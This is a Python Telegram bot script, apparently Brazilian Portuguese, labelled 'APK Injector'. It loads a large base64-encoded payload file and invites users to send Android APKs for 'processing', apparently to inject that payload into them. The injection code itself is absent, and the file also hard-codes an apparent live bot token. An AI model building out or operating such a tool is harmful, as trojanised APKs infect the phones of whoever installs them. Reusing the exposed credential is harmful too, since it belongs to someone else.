import os
import logging
import base64
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

TOKEN = "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A"
PAYLOAD_B64_PATH = "payload.b64"

# Função corrigida com padding automático
def load_payload():
    if not os.path.exists(PAYLOAD_B64_PATH):
        logger.error(f"❌ Arquivo não encontrado: {PAYLOAD_B64_PATH}")
        return None
    try:
        with open(PAYLOAD_B64_PATH, "r") as f:
            b64 = f.read().strip()
        padding = (4 - len(b64) % 4) % 4
        if padding:
            b64 += "=" * padding
            logger.info(f"✅ Padding adicionado: {padding}")
        data = base64.b64decode(b64)
        logger.info(f"✅ Payload carregado! {len(data)} bytes")
        return data
    except Exception as e:
        logger.error(f"❌ Erro: {e}")
        return None

PAYLOAD = load_payload()

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if PAYLOAD:
        await update.message.reply_text(f"✅ Sistema OK\n📦 Payload: {len(PAYLOAD) // (1024*1024)} MB")
    else:
        await update.message.reply_text("❌ Payload não disponível!")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("📥 Enviar APK", callback_data="send_apk")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🤖 Bot APK Injector\n\nEnvie um APK para processar.", reply_markup=reply_markup)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_command))
    logger.info("✅ Bot rodando!")
    app.run_polling(allowed_updates=[])

if __name__ == "__main__":
    main()
